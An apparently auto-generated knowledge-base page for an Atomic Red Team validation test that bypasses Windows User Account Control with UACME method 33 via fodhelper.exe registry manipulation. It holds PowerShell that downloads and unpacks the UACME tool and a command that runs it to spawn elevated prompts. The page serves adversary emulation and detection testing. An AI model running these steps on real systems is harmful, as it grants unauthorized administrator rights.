---
atomic_guid: "e514bb03-f71c-4b22-9092-9f961ec6fb03"
title: "UACME Bypass Method 33"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-27 19:12:28"
executor: "command_prompt"
aliases:
  - "e514bb03-f71c-4b22-9092-9f961ec6fb03"
  - "UACME Bypass Method 33"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: winscripting.blog

Type:	Shell API

Method: Registry key manipulation

Target:	\system32\fodhelper.exe

Component:	Attacker defined

Implementation:	ucmShellRegModMethod

UCM Method:	UacMethodMsSettings2

https://github.com/hfiref0x/UACME

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism#^t1548002-bypass-user-account-control|T1548.002: Bypass User Account Control]]

## Input Arguments

### uacme_exe

- description: Path to uacme executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\uacme\33 Akagi64.exe

## Dependencies

UACME executable must exist on disk at specified location ("#{uacme_exe}")

### Prerequisite Check

```powershell
$tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder\..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" -Force
```

## Executor

- name: command_prompt

### Command

```cmd
"#{uacme_exe}"
```

### Cleanup

```cmd
powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
